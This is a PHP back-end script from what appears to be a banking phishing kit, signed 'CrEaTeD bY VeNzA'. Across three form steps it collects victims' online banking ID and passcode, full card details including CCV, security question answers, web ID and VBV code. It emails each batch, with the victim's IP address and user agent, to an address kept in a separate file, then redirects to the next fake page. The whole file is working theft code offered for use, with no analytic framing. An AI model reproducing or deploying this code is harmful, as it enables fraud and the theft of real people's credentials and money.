<?php
include 'email.php';

if (isset($_POST['btn1'])) {
	
	$count = $_POST['count'];

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "Online ID            : ".$_POST['ai']."\n";
	$message .= "Passcode              : ".$_POST['pr']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
	header("Location: ./detail.html");
	
	
}
else if (isset($_POST['btn2'])) {
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "name on Card            : ".$_POST['ccname']."\n";
	$message .= "Card Number            : ".$_POST['ccno']."\n";
	$message .= "Expiry Date           : ".$_POST['month']."-".$_POST['year']."\n";
	$message .= "CCV            : ".$_POST['ccv']."\n";
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message);
	$count=$_POST['count']; 
	if ($count==1) {
		header("Location: ./quest.html");
		return false;
	}
	header("Location: ./detail.html?count=1");
	
	
}
else if (isset($_POST['btn3'])) {
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "Question 1            : ".$_POST['q1']."\n";
	$message .= "Answer            : ".$_POST['ans1']."\n";
	$message .= "Question 2            : ".$_POST['q2']."\n";
	$message .= "Answer            : ".$_POST['ans2']."\n";
	$message .= "Web ID          : ".$_POST['webid']."\n";
	$message .= "VBV           : ".$_POST['vbv']."\n";
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message);
	
	header("Location: ./thank.html");
	
	
}

?>